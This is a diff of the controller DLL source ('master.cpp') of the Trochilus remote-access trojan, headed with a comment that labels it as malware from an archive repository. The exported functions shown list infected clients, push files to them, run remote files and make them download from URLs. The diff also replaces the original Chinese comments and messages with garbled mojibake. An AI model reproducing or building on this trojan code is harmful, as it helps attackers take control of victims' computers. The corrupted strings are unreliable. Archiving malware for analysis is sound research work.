@@ -1,4 +1,15 @@
-// master.cpp : ¶¨Òå DLL Ó¦ÓÃ³ÌÐòµÄµ¼³öº¯Êý¡£
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
+// master.cpp : ï¿½ï¿½ï¿½ï¿½ DLL Ó¦ï¿½Ã³ï¿½ï¿½ï¿½Äµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //
 
 #include "stdafx.h"
@@ -207,7 +218,7 @@ static DWORD WINAPI ListDiskThread(LPVOID lpParameter)
 }
 
 
-//******************** µ¼³ö½Ó¿Ú±ãÀûº¯Êý ***************************
+//******************** ï¿½ï¿½ï¿½ï¿½ï¿½Ó¿Ú±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ***************************
 static DWORD			g_lastError;
 static ULONG			g_dwWaitReplyTimeoutS = 10;
 
@@ -218,7 +229,7 @@ static void SetMasterLastError(DWORD errorNO)
 
 static BOOL WaitForReply(LPCTSTR clientid, MSGSERIALID msgSerialID, CommData& replyData)
 {
-	//µÈ´ý»ØÓ¦
+	//ï¿½È´ï¿½ï¿½ï¿½Ó¦
 	DWORD dwSleepMS = 200;
 	BOOL bReplied = FALSE;
 	for (int i = 0; i < (int)(g_dwWaitReplyTimeoutS * 1000 / dwSleepMS); i++)
@@ -232,7 +243,7 @@ static BOOL WaitForReply(LPCTSTR clientid, MSGSERIALID msgSerialID, CommData& re
 		}
 	}
 
-	//Èç¹û³¬Ê±
+	//ï¿½ï¿½ï¿½ï¿½ï¿½Ê±
 	if (! bReplied)
 	{
 		SetMasterLastError(MASTERROR_REPLY_TIMEOUT);
@@ -244,7 +255,7 @@ static BOOL WaitForReply(LPCTSTR clientid, MSGSERIALID msgSerialID, CommData& re
 	}
 }
 
-//***************************** µ¼³ö½Ó¿ÚµÄÊµÏÖ **********************************
+//***************************** ï¿½ï¿½ï¿½ï¿½ï¿½Ó¿Úµï¿½Êµï¿½ï¿½ **********************************
 MASTER2_API DWORD GetMasterLastError()
 {
 	return g_lastError;
@@ -255,17 +266,17 @@ MASTER2_API LPCTSTR GetMasterErrorMsg( DWORD dwLastError )
 	switch (dwLastError)
 	{
 	case MASTERROR_REPLY_SUCCESS:
-		return _T("Ã»ÓÐ´íÎó");
+		return _T("Ã»ï¿½Ð´ï¿½ï¿½ï¿½");
 		break;
 	case MASTERROR_REPLY_TIMEOUT:
-		return _T("½ÓÊÕ»ØÓ¦³¬Ê±");
+		return _T("ï¿½ï¿½ï¿½Õ»ï¿½Ó¦ï¿½ï¿½Ê±");
 		break;
 	case MASTERROR_NO_EXPECTED_DATA:
-		return _T("ÔÚ»ØÓ¦Êý¾ÝÖÐÃ»ÓÐÕÒµ½ÐèÒªµÄ²¿·Ö");
+		return _T("ï¿½Ú»ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½Òµï¿½ï¿½ï¿½Òªï¿½Ä²ï¿½ï¿½ï¿½");
 		break;
 	}
 
-	return _T("Î´Öª´íÎó");
+	return _T("Î´Öªï¿½ï¿½ï¿½ï¿½");
 }
 
 MASTER2_API void ListAvailableClients( MyStringList* pClientidList )
@@ -442,7 +453,7 @@ MASTER2_API void RegisterCommMsgHandler( MSGID msgid, FnMsgHandler fnHandler, LP
 	CommManager::GetInstanceRef().RegisterMsgHandler(msgid, fnHandler, lpParameter);
 }
 
-/***********************ÎÄ¼þ¹ÜÀíAPI***********************************/
+/***********************ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½API***********************************/
 
 MASTER2_API BOOL PutFileToClient( LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath )
 {
@@ -528,7 +539,7 @@ MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath)
 	}
 }
 
-/***********************Ä£¿é¹¦ÄÜAPI***********************************/
+/***********************Ä£ï¿½é¹¦ï¿½ï¿½API***********************************/
 MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path)
 {
 	return CHttpDown::GetInstanceRef().Down(clientid,url,path);
